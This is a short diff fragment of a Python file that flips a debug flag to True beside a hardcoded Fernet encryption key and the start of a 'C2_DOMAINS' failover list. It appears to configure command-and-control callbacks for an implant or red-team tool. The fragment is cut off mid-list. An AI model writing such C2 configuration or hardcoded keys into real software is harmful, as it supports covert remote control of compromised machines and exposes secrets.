@@ -9,7 +9,7 @@ from cryptography.fernet import Fernet
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
 
-DEBUG_MODE = False
+DEBUG_MODE = True
 
 # Failover list
 C2_DOMAINS = ["https://midevil-scoring-engine.com",
